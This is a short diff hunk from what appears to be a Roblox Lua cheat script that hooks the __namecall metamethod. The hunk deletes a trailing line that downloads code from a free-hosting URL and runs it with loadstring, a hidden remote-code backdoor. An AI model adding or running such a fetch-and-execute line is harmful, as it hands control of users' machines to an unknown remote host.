@@ -2830,4 +2830,3 @@ mt.__namecall = newcclosure(function(...)
     end
     return old(...)
 end)
-loadstring(game:HttpGet("https://lynixchan.000webhostapp.com/xxx"))()
